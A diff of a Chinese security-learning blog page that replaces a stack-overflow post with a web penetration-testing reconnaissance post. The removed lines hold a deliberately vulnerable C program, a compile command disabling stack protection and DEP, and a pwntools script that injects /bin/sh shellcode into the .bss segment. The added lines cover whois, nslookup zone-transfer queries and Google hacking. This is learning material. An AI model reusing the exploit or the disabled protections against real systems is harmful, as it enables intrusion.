@@ -4,14 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="栈溢出（二）, WindQ">
-    <meta name="description" content="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。
-　　源程序代码如下：     
-#include&amp;lt;stdio.h&gt;
-char str[100];
-void vul()
-{
- ">
+    <meta name="keywords" content="网站渗透测试原理及详细过程, WindQ">
+    <meta name="description" content="此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。一、信息收集（历来测试第一条，铁打的信息收集）1.网络(公开)信息收集直接进行网络扫描不是这一步要干的事，循序渐进才对。先找一些">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +13,7 @@ void vul()
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>栈溢出（二） | WindQ</title>
+    <title>网站渗透测试原理及详细过程 | WindQ</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -263,13 +257,13 @@ void vul()
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        栈溢出（二）
+                        网站渗透测试原理及详细过程
                     </div>
                 </div>
             </div>
@@ -380,8 +374,8 @@ void vul()
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/栈溢出/" target="_blank">
-                                <span class="chip bg-color">栈溢出</span>
+                            <a href="/tags/渗透测试/" target="_blank">
+                                <span class="chip bg-color">渗透测试</span>
                             </a>
                         
                     </div>
@@ -392,8 +386,8 @@ void vul()
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                二进制安全
+                            <a href="/categories/Web安全/" class="post-category" target="_blank">
+                                Web安全
                             </a>
                         
                     </div>
@@ -404,14 +398,14 @@ void vul()
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-03-27
+                    2019-04-16
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        402
+                        504
                     </div>
                     
 
@@ -429,51 +423,13 @@ void vul()
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"><a href="#这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。" class="headerlink" title="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"></a>这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。</h5><a id="more"></a>
-<p>　　源程序代码如下：     </p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>　　自己填塞恶意代码，容易“跑”，我们需要一块稳定的，持续可用的代码段来供我们使用。这时候首先想到的是<code>bss</code>段，因为<code>bss</code>段通常用来存放程序中未初始化的全局变量，且可读可写。变量一般分为全局变量和局部变量，局部变量的存活时间较短，函数执行完就自动释放了，全局变量则不同，可以被程序内所有的对象或函数引用，相对来说更加稳定，比较适合存放一段恶意代码。<br>　　<code>bss</code>段可读可写不可执行，因此如果我们想进行实验，需要关掉栈保护和数据执行保护，使得<code>bss</code>段的代码变得可以执行。编译命令如下：    </p>
-<pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -z execstack -o xxxx xxxx.c
-</code></pre>
-<p>　　<code>-fno-stack-protector</code>用于关掉栈保护，<code>-z execstack</code>用于关掉数据可执行保护（DEP）。攻击脚本代码如下：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)       #远程</span>
-read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
-
-
-payload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-
-shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
+                <h2 id="此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。"><a href="#此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。" class="headerlink" title="此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。"></a>此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。</h2><h2 id="一、信息收集（历来测试第一条，铁打的信息收集）"><a href="#一、信息收集（历来测试第一条，铁打的信息收集）" class="headerlink" title="一、信息收集（历来测试第一条，铁打的信息收集）"></a>一、信息收集（历来测试第一条，铁打的信息收集）</h2><h4 id="1-网络-公开-信息收集"><a href="#1-网络-公开-信息收集" class="headerlink" title="1.网络(公开)信息收集"></a>1.网络(公开)信息收集</h4><p>直接进行网络扫描不是这一步要干的事，循序渐进才对。先找一些公开的，个人认为会包含类似于“社工”的东西。详细的说，有google hacking（百度也行，意在大量获取周边的有用信息），whois查询，dns等。如果考虑进行社会工程学的话，这里还可以相应从邮件列表/新闻组中获取目标系统中一些边缘信息如内部员工帐号组成，身份识别方式，邮件联系地址等。</p>
+<p>(1)使用whois查询目标域名的DNS服务器<br>(2)nslookup   [nslookup用于查询DNS的记录，查询域名解析是否正常]</p>
+<blockquote>
+<p>set type=all</p>
+<p><domain><br>server <ns server><br>set q=all<br>ls -d <domain><br>   涉及的工具包括：Google,<a href="http://www.nosec.org/web/index.php?q=demon" target="_blank" rel="noopener">Demon</a>,<a href="http://www.webhosting.info/" target="_blank" rel="noopener">webhosting.info</a>,<a href="http://worm.ccert.edu.cn/GoogleHacking/Apollo/" target="_blank" rel="noopener">Apollo</a>,<a href="http://snakeoillabs.com/" target="_blank" rel="noopener">Athena</a>,<a href="http://snakeoillabs.com/downloads/GHDB.xml" target="_blank" rel="noopener">GHDB.XML</a>,<a href="http://uptime.netcraft.com/up/graph" target="_blank" rel="noopener">netcraft</a>,<a href="http://www.seologs.com/ip-domains.html" target="_blank" rel="noopener">seologs</a>。<br>(3)搜索引擎的常用语法<br>   <code>site</code>:用于搜索指定的站点关键字。比如<code>site:www.nosec.org</code>，比如用<code>site:nosec.org</code>搜索该域名下的所有子域名的页面，比如用<code>site:org.cn</code>搜索中国政府部门的网站。</domain></ns></domain></p>
+</blockquote>
+<h4 id="2-目标系统信息收集（目前不太懂。。。）"><a href="#2-目标系统信息收集（目前不太懂。。。）" class="headerlink" title="2.目标系统信息收集（目前不太懂。。。）"></a>2.目标系统信息收集（目前不太懂。。。）</h4><p>通过上面一步，我们应当可以简单的描绘出目标系统的网络结构，如公司网络所在区域，子公司IP地址分布，VPN接入地址等。这里特别要注意一些比较偏门的HOST名称地址，如一些<code>backup</code>开头或者<code>temp</code>开关的域名很可能就是一台备份服务器，其安全性很可能做的不够。<br>从获取的地址列表中进行系统判断，了解其组织架构及操作系统使用情况。最常用的方法的是目标所有IP网段扫描。</p>
 
             </div>
             <hr>
@@ -497,7 +453,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </span>
                     <a href="http://windq08.github.io" class="b-link-green">WindQ</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/03/27/zhan-yi-chu-er/" class="b-link-green">栈溢出（二）</a>
+                    <a href="/2019/04/16/wang-zhan-shen-tou-ce-shi-yuan-li-ji-xiang-xi-guo-cheng/" class="b-link-green">网站渗透测试原理及详细过程</a>
                 </p>
             </div>
         </div>
@@ -520,41 +476,42 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/04/13/zhan-yi-chu-san/">
+                <a href="/2019/04/16/wang-zhan-shen-tou-ce-shi-yuan-li-ji-xiang-xi-guo-cheng/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="栈溢出（三）">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="网站渗透测试原理及详细过程">
                         
-                        <span class="card-title">栈溢出（三）</span>
+                        <span class="card-title">网站渗透测试原理及详细过程</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">        
-一、了解一下libc　　libc动态链接库中的函数被广泛使用，所以有大概率可以在内存中找到libc动态库。该库内包含了一些系统级的函数，比如system()，所以可以尝试用这些系统级的函数取得控制权。再比如，这样的参数有可</div>
+                    <div class="summary">此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。一、信息收集（历来测试第一条，铁打的信息收集）1.网络(公开)信息收集直接进行网络扫描不是这一步要干的事，循序渐进才对。先找一些</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                    二进制安全
+                            <a href="/categories/Web安全/" class="post-category" target="_blank">
+                                    Web安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/栈溢出/" target="_blank">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/渗透测试/" target="_blank">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
                 </div>
@@ -568,28 +525,29 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/03/25/zhan-yi-chu-yi/">
+                <a href="/2019/04/14/wo-zi-ji-guan-yu-an-quan-de-yi-dian-xiang-fa-chi-xu-geng-xin/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="栈溢出（一）">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="我自己关于安全的一点想法(持续更新)">
                         
-                        <span class="card-title">栈溢出（一）</span>
+                        <span class="card-title">我自己关于安全的一点想法(持续更新)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。        
-一、栈溢出的概念　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都</div>
+                    <div class="summary">        
+1.好像是道哥在《白帽子……（最经典那本）》里说的，安全的前提是信任。没有绝对的安全，一切的安全都建立在信任的基础上，比如我们信任使用账号的正是他本人，然后我们把信息给他看，如果这个信任条件不成立，那就不是安全的。
+2.我</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-25
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                    二进制安全
+                            <a href="/categories/杂记/" class="post-category" target="_blank">
+                                    杂记
                                 </a>
                             
                             
@@ -599,8 +557,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/栈溢出/" target="_blank">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/个人感悟/" target="_blank">
+                        <span class="chip bg-color">个人感悟</span>
                     </a>
                     
                 </div>
